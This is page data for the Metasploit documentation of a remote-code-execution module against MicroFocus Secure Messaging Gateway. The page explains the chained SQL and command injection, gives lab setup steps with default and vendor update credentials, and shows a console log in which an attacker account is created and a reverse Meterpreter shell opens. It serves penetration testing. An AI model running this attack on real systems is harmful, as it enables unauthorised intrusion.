{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/microfocus_secure_messaging_gateway","result":{"data":{"moduleMetadataJson":{"id":"80cbb427-be74-5c23-8acf-737b03a06d3d","name":"MicroFocus Secure Messaging Gateway Remote Code Execution","fullname":"exploit/linux/http/microfocus_secure_messaging_gateway","description":"This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging Gateway.\n        An unauthenticated user can execute a terminal command under the context of the web user.\n\n        One of the user supplied parameters of API endpoint is used by the application without input validation and/or parameter binding,\n        which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a ability to add new user onto system.\n        manage_domains_dkim_keygen_request.php endpoint is responsible for executing an operation system command. It's not possible\n        to access this endpoint without having a valid session.\n\n        Combining these vulnerabilities gives the opportunity execute operation system commands under the context\n        of the web user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/microfocus_secure_messaging_gateway","documentationSlug":"/modules/documentation/exploit/linux/http/microfocus_secure_messaging_gateway","referencesSlug":"/modules/references/exploit/linux/http/microfocus_secure_messaging_gateway"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a SQL injection and command injection vulnerability in MicroFocus Secure Messaging\nGateway. An unauthenticated user can execute a terminal command under the context of the web user.</p>\n<p>One of the user supplied parameters of API endpoint is used by the application without input validation\nand/or parameter binding, which leads to SQL injection vulnerability. Successfully exploiting this\nvulnerability gives a ability to add new user onto system. manage<em>domains</em>dkim<em>keygen</em>request.php\nendpoint is responsible for executing an operation system command. It's not possible to access this\nendpoint without having a valid session.</p>\n<p>Combining these vulnerabilities gives the opportunity execute operation system commands under the\ncontext of the web user.</p>\n<h3 id=\"installation-steps\" style=\"position:relative;\"><a href=\"#installation-steps\" aria-label=\"installation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installation Steps</h3>\n<p>Complete the following trial submission form. You will be able to <a href=\"https://www.microfocus.com/products/secure-gateway/trial/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">download the product as a OVA or ISO file</a>.\nInstallation instructions can be <a href=\"https://www.microfocus.com/documentation/secure-messaging-gateway/GWAVA%207.0/secure-gateway.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">found here</a>.</p>\n<p>Please note that newer trial appliances by default are no longer vulnerable to the attacks used by\nthis module, but for testing purposes there is a way to make it vulnerable again.</p>\n<p>First, go ahead and install the ISO. The appliance is based on Debian (for example, version 7 is\nrunning a modified version of Ubuntu 16.04), so installation should be very similar to that.</p>\n<p>After you log into the system as \"gwava:gwava\" (which is the default credential), you should see\nthis on your screen:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">####################################\n\nPlease run the following command:\n\nsudo /opt/gwavapreinstall.sh\n\n####################################</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The gwavapreinstall.sh script is what you need to modify. To do this, open it with your favorite text\neditor with sudo like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ sudo nano -w /opt/gwavapreinstall.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>The bash script uses svn to download the latest software from the official site, but we can go back to\na specific commit to test the vulnerability again. Go ahead and find this line in the file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo svn co --username gwavaupdate --password gwavam8 --non-interactive https://gwava7updates.gwava.com/update/gwava7/release $GWAVA_DIR</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And modify to (the difference is the <code class=\"language-text\">release@444</code>):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo svn co --username gwavaupdate --password gwavam8 --non-interactive https://gwava7updates.gwava.com/update/gwava7/release@444 $GWAVA_DIR</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Make sure you save it, and then now run the script:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ sudo /opt/gwavapreinstall.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>After running the script, make sure to browse to <a href=\"https://%5BIP\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://[IP</a>] to complete the installation. And then\nafter that, you are ready to test the module.</p>\n<p>Note that the module may not work at the very first try, but the second time should work.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/linux/http/microfocus_secure_messaging_gateway</code></li>\n<li>Set <code class=\"language-text\">RHOST</code></li>\n<li>Set <code class=\"language-text\">LHOST</code></li>\n<li>Run <code class=\"language-text\">check</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">The target is vulnerable</code></li>\n<li>Run <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Creating an user with appropriate privileges</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">User successfully created. Username : rmcynlbredxqh</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Authenticating with created user</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Successfully authenticated</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Creating a domain with a malformed DKIM data</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Payload is successfully implanted</code> in console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Triggering an implanted payload</code> in console.</li>\n<li><strong>Verify</strong> that you are getting meterpreter session.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/microfocus_secure_messaging_gateway \nmsf5 exploit(linux/http/microfocus_secure_messaging_gateway) &gt; set RHOSTS 12.0.0.25\nRHOSTS =&gt; 12.0.0.25\nmsf5 exploit(linux/http/microfocus_secure_messaging_gateway) &gt; set LHOST 12.0.0.1\nLHOST =&gt; 12.0.0.1\nmsf5 exploit(linux/http/microfocus_secure_messaging_gateway) &gt; run\n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Creating an user with appropriate privileges\n[+] User successfully created. Username : rmcynlbredxqh\n[*] Authenticating with created user\n[+] Successfully authenticated\n[*] Creating a domain record with a malformed DKIM data\n[+] Payload is successfully implanted\n[*] Triggering an implanted payload\n[*] Sending stage (37775 bytes) to 12.0.0.25\n[*] Meterpreter session 10 opened (12.0.0.1:4444 -&gt; 12.0.0.25:44332) at 2018-06-25 20:26:54 +0100\n[*] Cleaning up...\n\nmeterpreter &gt; pwd\n/opt/gwava/gwavaman/http/admin/contents/ou\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"80cbb427-be74-5c23-8acf-737b03a06d3d"}}}